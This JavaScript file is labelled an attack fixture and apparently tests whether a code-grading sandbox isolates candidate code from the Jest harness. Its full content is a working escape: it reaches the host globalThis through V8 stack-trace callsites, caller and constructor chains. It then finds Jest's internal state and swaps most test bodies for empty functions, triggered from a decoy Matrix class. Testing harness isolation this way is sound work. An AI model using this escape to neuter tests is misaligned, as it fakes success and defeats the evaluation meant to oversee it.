// ATTACK FIXTURE (never training data). Tries to reach the test realm from inside the candidate context through
// V8 callsites (Error.prepareStackTrace -> getThis/getFunction), through returned-value hooks, and through
// constructor chains; if any reaches a foreign globalThis, it runs the J1 test-body swap there.
let found = null;
const tried = [];
function grab(o) {
  if (!o || (typeof o !== 'object' && typeof o !== 'function')) return;
  try { const g = o.constructor.constructor('return globalThis')(); if (g && g !== globalThis) found = g; } catch (e) { tried.push(String(e && e.message)); }
}
function probe() {
  const orig = Error.prepareStackTrace;
  Error.prepareStackTrace = (_e, cs) => cs;
  const cs = new Error().stack;
  Error.prepareStackTrace = orig;
  if (Array.isArray(cs)) for (const c of cs) { try { grab(c.getThis()); } catch (e) {} try { grab(c.getFunction()); } catch (e) {} }
  try { grab(probe.caller); } catch (e) {}
}
function swap(g) {
  const sym = Object.getOwnPropertySymbols(g).find((s) => String(s) === 'Symbol(JEST_STATE_SYMBOL)');
  const walk = (b) => { for (const c of b.children || []) { if (c.type === 'test') { if (!/^z[0-9a-f]{12}c\d$/.test(c.name)) c.fn = () => {}; } else walk(c); } };
  if (sym) walk(g[sym].rootDescribeBlock);
}
probe();
if (found) swap(found);
class Matrix {
  constructor() { probe(); if (found) swap(found); }
  get rows() { probe(); if (found) { swap(found); return found.__g10_escaped = true; } return []; }
  get columns() { return []; }
}
module.exports = { Matrix };
